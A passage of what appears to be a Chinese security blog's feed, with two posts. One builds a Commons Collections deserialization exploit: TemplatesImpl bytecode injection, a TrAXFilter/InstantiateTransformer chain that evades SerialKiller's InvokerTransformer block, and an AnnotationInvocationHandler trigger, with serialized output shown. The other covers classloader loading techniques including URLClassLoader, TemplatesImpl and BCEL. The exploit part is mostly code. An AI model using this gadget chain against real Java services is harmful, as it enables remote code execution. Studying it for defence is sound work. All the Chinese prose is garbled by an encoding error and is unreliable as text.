org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonsCollectionsIntro2</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String fieldName, Object</span></span><br><span class="line"><span class="params">            value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">// source: bytecodes/HelloTemplateImpl.java</span></span><br><span class="line">        <span class="type">byte</span>[] code = Base64.getDecoder().decode(<span class="string">&quot;base64å­—èŠ‚ç &quot;</span>);</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">obj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][] &#123;code&#125;);</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;HelloTemplatesImpl&quot;</span>);</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(obj),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;newTransformer&quot;</span>, <span class="literal">null</span>, <span class="literal">null</span>)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span></span><br><span class="line">                <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> TransformedMap.decorate(innerMap, <span class="literal">null</span>,</span><br><span class="line">                transformerChain);</span><br><span class="line">        outerMap.put(<span class="string">&quot;test&quot;</span>, <span class="string">&quot;xxxx&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç„¶è€Œåœ¨<code>SerialKiller</code>ååºåˆ—åŒ–è¿‡æ»¤å™¨ä¸­<br>è¿‡æ»¤äº†<code>InvokerTransformer</code><br>é‚£ä¹ˆæˆ‘ä»¬å¯ä»¥é€‰ç”¨å¦å¤–ä¸€ä¸ªé“¾å­ï¼š</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(TrAXFilter.class),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(<span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; Templates.class &#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[] &#123; obj &#125;)</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>å°è¯•åˆ©ç”¨å‰é¢12ç¯‡æ–‡ç« å­¦åˆ°çš„çŸ¥è¯†æ„é€ POC</p><h3 id="æ„é€ POC"><a href="#æ„é€ POC" class="headerlink" title="æ„é€ POC"></a>æ„é€ POC</h3><p>å…ˆæ¥ä¸€ä¸ªæ¶æ„ç±»ï¼š</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> <span class="keyword">extends</span> <span class="title class_">AbstractTranslet</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException &#123;&#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, DTMAxisIterator iterator,SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException &#123;&#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Test</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>();</span><br><span class="line">        System.out.println(<span class="string">&quot;CustomTransletClass loaded&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åœ¨windowsä¸­åˆ©ç”¨å¦‚ä¸‹å‘½ä»¤å¯¹classæ–‡ä»¶è¿›è¡Œå–base64ç¼–ç ï¼š</p><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">[<span class="type">Convert</span>]::ToBase64String([<span class="type">IO.File</span>]::ReadAllBytes(<span class="string">&quot;CustomClass.class&quot;</span>)) <span class="operator">-replace</span> <span class="string">&quot;`n|`r&quot;</span></span><br></pre></td></tr></table></figure><p>å›å¿†ä¹‹å‰çš„æ­¥éª¤<br>æˆ‘ä»¬å…ˆå°†<code>outerMap</code>è§¦å‘æ”¹ä¸º<code>interMap</code>é¢„å¡«å……<br>è¿™é‡Œé”®åä¸€å®šè¦æ˜¯<code>&quot;value&quot;</code>ï¼š</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"><span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">innerMap.put(<span class="string">&quot;value&quot;</span>, <span class="string">&quot;xxxx&quot;</span>);</span><br><span class="line"><span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> TransformedMap.decorate(innerMap, <span class="literal">null</span>, transformerChain);</span><br><span class="line"></span><br><span class="line"><span class="comment">//outerMap.put(&quot;test&quot;, &quot;xxxx&quot;);</span></span><br></pre></td></tr></table></figure><p>å†åˆ©ç”¨<code>AnnotationInvocationHandlerâ€‹</code>è‡ªåŠ¨è§¦å‘<code>outermMap</code>çš„å¡«å……</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line"><span class="type">Constructor</span> <span class="variable">construct</span> <span class="operator">=</span> clazz.getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">construct.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">InvocationHandler</span> <span class="variable">handler</span> <span class="operator">=</span> (InvocationHandler)construct.newInstance(Retention.class, outerMap);</span><br></pre></td></tr></table></figure><p>å°†<code>handler</code>åºåˆ—åŒ–å¹¶è½¬ä¸ºbase64ï¼š</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">ByteArrayOutputStream</span> <span class="variable">barr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line"><span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(barr);</span><br><span class="line">oos.writeObject(handler);</span><br><span class="line">oos.close();</span><br><span class="line">System.out.println(Base64.getEncoder().encodeToString(barr.toByteArray()));</span><br></pre></td></tr></table></figure><p>æµ‹è¯•ï¼š</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">byte</span>[] payload = Base64.getDecoder().decode(<span class="string">&quot;ä¸Šä¸€æ­¥è¾“å‡ºçš„base64&quot;</span>);</span><br><span class="line"><span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(payload));</span><br><span class="line">ois.readObject();</span><br></pre></td></tr></table></figure><p>æˆåŠŸè¾“å‡ºï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CustomTransletClass loaded</span><br><span class="line">Exception in thread &quot;main&quot; org.apache.commons.collections.FunctorException: InvokerTransformer: The method &#x27;newInstance&#x27; on &#x27;class java.lang.reflect.Constructor&#x27; threw an exception</span><br><span class="line">at org.apache.commons.collections.functors.InvokerTransformer.transform(InvokerTransformer.java:133)</span><br><span class="line">at org.apache.commons.collections.functors.ChainedTransformer.transform(ChainedTransformer.java:123)</span><br><span class="line">at org.apache.commons.collections.map.TransformedMap.checkSetValue(TransformedMap.java:204)</span><br><span class="line">        ...</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> çŸ¥è¯† </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>javaçš„classloaderä»¬</title>
      <link href="/2025/04/03/java-classloaders/"/>
      <url>/2025/04/03/java-classloaders/</url>
      
        <content type="html"><![CDATA[<p>ä¹‹å‰åœ¨CC1å’ŒCC6çš„é“¾å­ä¸­<br>ä¸€å¼€å§‹éƒ½ä½¿ç”¨äº†åå°„è°ƒç”¨<code>Runtime.class</code><br>è¿™é‡Œçš„<code>.class</code>å¯¹è±¡æ˜¯ç±»è¢«jvmåŠ è½½æ—¶åˆ›å»ºçš„å…ƒæ•°æ®</p><p>è€Œjvméœ€è¦åŠ è½½ä¸€ä¸ªç±»æ—¶<br>ä¼šå»ç£ç›˜ä¸ŠåŠ è½½<code>.class</code>æ–‡ä»¶<br>è¿™é‡Œçš„<code>.class</code>æ–‡ä»¶æ˜¯æºç ç¼–è¯‘åçš„äºŒè¿›åˆ¶å­—èŠ‚ç æ•°æ®</p><p>æ—¢ç„¶æ˜¯å­—èŠ‚ç æ•°æ®é‚£ä¹ˆå’Œååºåˆ—åŒ–æ—¶ä½¿ç”¨çš„åºåˆ—åŒ–æ•°æ®ä¸€æ ·<br>å¾ˆå¤šä¸æ˜¯å¯è§å­—ç¬¦ï¼Œéœ€è¦å€ŸåŠ©ç¼–ç ç­‰æ–¹å¼è¿›è¡Œç›´æ¥ä¼ è¾“</p><p>å½“ç„¶è¿˜æœ‰è¿œç¨‹åŠ è½½çš„æ–¹æ³•ï¼š</p><h3 id="URLClassLoader"><a href="#URLClassLoader" class="headerlink" title="URLClassLoader"></a>URLClassLoader</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.net.URLClassLoader;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloClassLoader</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">( String[] args )</span> <span class="keyword">throws</span> Exception</span><br><span class="line">    &#123;</span><br><span class="line">        URL[] urls = &#123;<span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;http://localhost:80/&quot;</span>)&#125;;</span><br><span class="line">        <span class="type">URLClassLoader</span> <span class="variable">loader</span> <span class="operator">=</span> URLClassLoader.newInstance(urls);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> loader.loadClass(<span class="string">&quot;Hello&quot;</span>);</span><br><span class="line">        c.newInstance();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™æ®µä»£ç ä¼šåœ¨80ç«¯å£çš„æœ¬åœ°ç½‘ç«™æ ¹ç›®å½•ä¸‹åŠ è½½ä¸€ä¸ª<code>Hello.class</code></p><h3 id="åŠ è½½çš„è¿‡ç¨‹"><a href="#åŠ è½½çš„è¿‡ç¨‹" class="headerlink" title="åŠ è½½çš„è¿‡ç¨‹"></a>åŠ è½½çš„è¿‡ç¨‹</h3><p>åŠ è½½çš„è¿‡ç¨‹ç»å†äº†ä¸‰ä¸ªå‡½æ•°ï¼š</p><ul><li><code>ClassLoader.loadclass</code></li></ul><p>åŒäº²å§”æ´¾æ¨¡å‹ï¼š<br>é¦–å…ˆæ£€æŸ¥ç±»æ˜¯å¦å·²åŠ è½½ï¼ˆé€šè¿‡ <code>findLoadedClass</code>ï¼‰ã€‚<br>è‹¥æœªåŠ è½½ï¼Œä¼˜å…ˆå§”æ´¾ç»™çˆ¶ç±»åŠ è½½å™¨ï¼ˆ<code>parent.loadClass</code>ï¼‰ï¼Œ<br>çˆ¶ç±»æ— æ³•åŠ è½½æ—¶ï¼Œæ‰è°ƒç”¨è‡ªèº«çš„ <code>findClass</code>ã€‚<br>è¿™ç§åˆ†å±‚è®¾è®¡ä¿è¯äº†æ ¸å¿ƒç±»åº“ï¼ˆå¦‚ <code>java.lang</code>ï¼‰<br>ç”±å¯åŠ¨ç±»åŠ è½½å™¨ï¼ˆ<code>Bootstrap ClassLoader</code>ï¼‰åŠ è½½ï¼Œ<br>é¿å…é‡å¤åŠ è½½å’Œå®‰å…¨æ€§é—®é¢˜ã€‚</p><p>ä½†æ˜¯è¿™ä¸ªåå­—æˆ‘è§‰å¾—æœ‰ç¿»è¯‘é—®é¢˜<br>åº”è¯¥å«<strong>çˆ¶ç±»å§”æ´¾æ¨¡å‹</strong><br>å¦åˆ™çš„è¯å¯èƒ½ä¼šé€ æˆæœ‰ä¸¤ä¸ªçˆ¶ç±»é“¾çš„è¯¯è§£</p><ul><li><code>ClassLoader.findclass</code></li></ul><p>ä¸€è·¯å‘ä¸Šç›´åˆ°å§”æ´¾åˆ°ç›®æ ‡å<br>æ‰§è¡Œç›®æ ‡ç±»è‡ªå®šä¹‰çš„<code>findClass</code><br>ä»æ–‡ä»¶ã€ç½‘ç»œç­‰è·å–ç±»çš„å­—èŠ‚ç </p><ul><li><code>ClassLoader.defineclass</code></li></ul><p>å½“<code>findclass</code>æˆåŠŸè¯»å–å­—èŠ‚ç åï¼Œ<br>ä¼ ç»™<code>defineclass</code><br>å°†å­—èŠ‚ç è½¬æ¢ä¸º<code>Class</code>å¯¹è±¡</p><h3 id="åˆ©ç”¨TemplatesImplåŠ è½½å­—èŠ‚ç "><a href="#åˆ©ç”¨TemplatesImplåŠ è½½å­—èŠ‚ç " class="headerlink" title="åˆ©ç”¨TemplatesImplåŠ è½½å­—èŠ‚ç "></a>åˆ©ç”¨TemplatesImplåŠ è½½å­—èŠ‚ç </h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.sun.org.apache.xalan.internal.xsltc.trax;</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªåŒ…ä¸­çš„<code>TemplatesImpl</code>æœ‰ä¸€ä¸ªå†…éƒ¨ç±»<code>TransletClassLoader</code><br>ä»–é‡å†™äº†åŠ è½½å­—èŠ‚ç çš„<code>defineclass</code>æ–¹æ³•ï¼š</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">class</span> <span class="title class_">TransletClassLoader</span> <span class="keyword">extends</span> <span class="title class_">ClassLoader</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Map&lt;String,Class&gt; _loadedExternalExtensionFunctions;</span><br><span class="line"></span><br><span class="line">        TransletClassLoader(ClassLoader parent) &#123;</span><br><span class="line">            <span class="built_in">super</span>(parent);</span><br><span class="line">        _loadedExternalExtensionFunctions = <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    TransletClassLoader(ClassLoader parent,Map&lt;String, Class&gt; mapEF) &#123;</span><br><span class="line">        <span class="built_in">super</span>(parent);</span><br><span class="line">        _loadedExternalExtensionFunctions = mapEF;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Class&lt;?&gt; loadClass(String name) <span class="keyword">throws</span> ClassNotFoundException &#123;</span><br><span class="line">        Class&lt;?&gt; ret = <span class="literal">null</span>;</span><br><span class="line">        <span class="comment">// The _loadedExternalExtensionFunctions will be empty when the</span></span><br><span class="line">        <span class="comment">// SecurityManager is not set and the FSP is turned off</span></span><br><span class="line">        <span class="keyword">if</span> (_loadedExternalExtensionFunctions != <span class="literal">null</span>) &#123;</span><br><span class="line">            ret = _loadedExternalExtensionFunctions.get(name);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (ret == <span class="literal">null</span>) &#123;</span><br><span class="line">            ret = <span class="built_in">super</span>.loadClass(name);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ret;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Access to final protected superclass member from outer class.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    Class <span class="title function_">defineClass</span><span class="params">(<span class="keyword">final</span> <span class="type">byte</span>[] b)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> defineClass(<span class="literal">null</span>, b, <span class="number">0</span>, b.length);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªé‡å†™çš„æ“ä½œä½¿å¾—åŸæœ¬è¢«<code>protect</code>çš„<code>defineClass</code>æ–¹æ³•<br>å˜æˆäº†<code>default</code>ï¼ˆå¯ä»¥ç†è§£ä¸ºåŒ…å†…<code>public</code>ï¼‰<br>é‚£æˆ‘ä»¬æ‰¾æ‰¾åŒ…å†…æœ‰æ²¡æœ‰<code>public</code>æ–¹æ³•ä½¿ç”¨äº†å®ƒ<br>å¦‚æœæœ‰çš„è¯æˆ‘ä»¬å°±å¯ä»¥åœ¨å¤–éƒ¨è°ƒç”¨å®ƒäº†<br>æœ‰ä¸€æ¡è°ƒç”¨é“¾ï¼š</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">TemplatesImpl#getOutputProperties() --&gt;</span><br><span class="line">TemplatesImpl#newTransformer() --&gt;</span><br><span class="line">TemplatesImpl#getTransletInstance() --&gt;</span><br><span class="line">TemplatesImpl#defineTransletClasses() --&gt;</span><br><span class="line">TransletClassLoader#defineClass()</span><br></pre></td></tr></table></figure><p>å‰ä¸¤è¡Œéƒ½æ˜¯<code>public</code><br>è¿™é‡Œå†™ä¸ªDEMO:</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TemplatesImplExample</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">byte</span>[] code = Base64.getDecoder().decode(<span class="string">&quot;base64&quot;</span>);</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">obj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][] &#123; code &#125;);</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;NOT NULL&quot;</span>);</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">        obj.newTransformer();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span></span><br><span class="line">            <span class="keyword">throws</span> NoSuchFieldException, IllegalAccessException &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>); <span class="comment">// å…è®¸è®¿é—®ç§æœ‰å­—æ®µ</span></span><br><span class="line">        field.set(obj, value);    <span class="comment">// è®¾ç½®å­—æ®µå€¼</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>base64çš„éƒ¨åˆ†å¡«æˆ‘ä»¬æ„é€ çš„æ¶æ„ç±»çš„å­—èŠ‚ç çš„base64ï¼š</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CustomTransletClass</span> <span class="keyword">extends</span> <span class="title class_">AbstractTranslet</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException &#123;&#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, DTMAxisIterator iterator,SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException &#123;&#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">CustomTransletClass</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>();</span><br><span class="line">        System.out.println(<span class="string">&quot;CustomTransletClass loaded&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œä½œä¸º<code>AbstractTranslet</code>çš„å­ç±»ï¼Œ<br>æ˜¯ä¸ºäº†é˜²æ­¢è§¦å‘<code>TemplatesImpl</code>ç±»åŠ è½½å™¨çš„æŸäº›é”™è¯¯<br>åé¢é‡åˆ°äº†å†ç»†ç ”ç©¶</p><h3 id="BCEL-ClassLoader-åŠ è½½å­—èŠ‚ç "><a href="#BCEL-ClassLoader-åŠ è½½å­—èŠ‚ç " class="headerlink" title="BCEL ClassLoader åŠ è½½å­—èŠ‚ç "></a>BCEL ClassLoader åŠ è½½å­—èŠ‚ç </h3><p>çœ‹çœ‹æºç :</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> Class <span class="title function_">loadClass</span><span class="params">(String class_name, <span class="type">boolean</span> resolve)</span> <span class="keyword">throws</span> ClassNotFoundException &#123;</span><br><span class="line">    <span class="type">Class</span> <span class="variable">cl</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// First try: lookup hash table.</span></span><br><span class="line">    cl = (Class) classes.get(class_name);</span><br><span class="line">    <span class="keyword">if</span> (cl == <span class="literal">null</span>) &#123;</span><br><span class="line"><span class="comment">// Second try: Load system class using system class loader. You better don&#x27;t mess around with them.for (int i = 0; i &lt; ignored_packages.length; i++) &#123;</span></span><br><span class="line">            <span class="keyword">if</span> (class_name.startsWith(ignored_packages[i])) &#123;</span><br><span class="line">                cl = deferTo.loadClass(class_name);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (cl == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="type">JavaClass</span> <span class="variable">clazz</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Third try: Special request?if (class_name.indexOf(&quot;$$BCEL$$&quot;) &gt;= 0) &#123;</span></span><br><span class="line">                clazz = createClass(class_name);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;<span class="comment">// Fourth try: Load classes via repository</span></span><br><span class="line">                clazz = repository.loadClass(class_name);</span><br><span class="line">                <span class="keyword">if</span> (clazz != <span class="literal">null</span>) &#123;</span><br><span class="line">                    clazz = modifyClass(clazz);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ClassNotFoundException</span>(class_name);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (clazz != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="type">byte</span>[] bytes = clazz.getBytes();</span><br><span class="line">                cl = defineClass(class_name, bytes, <span class="number">0</span>, bytes.length);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;<span class="comment">// Fourth try: Use default class loader</span></span><br><span class="line">                cl = Class.forName(class_name);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (resolve) &#123;</span><br><span class="line">            resolveClass(cl);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    classes.put(class_name, cl);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> cl;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é‡å†™äº†<code>loadclass</code>æ–¹æ³•<br>æºç æ³¨é‡Šä¸­æ³¨æ˜äº†å››æ¬¡åŠ è½½å°è¯•ï¼Œç®€å•æ¢³ç†ä¸€ä¸‹è¿™ä¸ªè¿‡ç¨‹ï¼š</p><ol><li>é¦–å…ˆå°è¯•ä» classesï¼ˆå“ˆå¸Œè¡¨ï¼‰ä¸­æŸ¥æ‰¾æ˜¯å¦å·²ç»åŠ è½½è¿‡è¿™ä¸ªç±»ã€‚å¦‚æœæ‰¾åˆ°äº†å°±ç›´æ¥è¿”å›</li><li>å¦‚æœç¼“å­˜ä¸­æ²¡æœ‰æ‰¾åˆ°ï¼Œæ–¹æ³•ä¼šè¿›è¡Œç¬¬äºŒæ¬¡å°è¯•ï¼šåŠ è½½ç³»ç»Ÿç±»ã€‚å®ƒä¼šéå†Â <code>ignored_packages</code>Â çš„å­—ç¬¦ä¸²æ•°ç»„ï¼Œè¿™ä¸ªæ•°ç»„é‡Œå­˜æ”¾ç€ä¸€äº›åŒ…åçš„å‰ç¼€ï¼ˆ<code>&quot;java.&quot;, &quot;javax.&quot;, &quot;sun.&quot;</code>ï¼‰ã€‚å¦‚æœè¦åŠ è½½çš„ç±»åä»¥è¿™äº›å‰ç¼€å¼€å¤´ï¼Œé‚£ä¹ˆè¿™ä¸ªç±»å°±è¢«è®¤ä¸ºæ˜¯ç³»ç»Ÿç±»ï¼Œä¼šé€šè¿‡è°ƒç”¨å¦ä¸€ä¸ªç±»åŠ è½½å™¨Â <code>deferTo</code>Â çš„Â <code>loadClass</code>Â æ–¹æ³•æ¥åŠ è½½ã€‚è¿™æ ·åšåº”è¯¥æ˜¯ä¸ºäº†é¿å…è‡ªå®šä¹‰çš„ç±»åŠ è½½å™¨å¹²æ‰°åˆ°ç³»ç»Ÿç±»çš„åŠ è½½</li><li>å¦‚æœä»ç„¶æ²¡æœ‰åŠ è½½æˆåŠŸï¼Œæ–¹æ³•ä¼šè¿›è¡Œç¬¬ä¸‰æ¬¡å°è¯•ï¼Œå¤„ç†ä¸€ä¸ªç‰¹æ®Šè¯·æ±‚ï¼šè‹¥ç±»åä»¥Â <code>$$BCEL$$</code>Â å¼€å¤´åˆ™è°ƒç”¨Â <code>createClass()</code>Â åˆ›å»ºä¸€ä¸ªç±»ï¼Œè¿™ä¸ªæ–¹æ³•å°† BCEL å­—èŠ‚ç è½¬æ¢æˆ JavaClass å¯¹è±¡</li><li>ä¸ä»¥Â <code>$$BCEL$$</code>Â 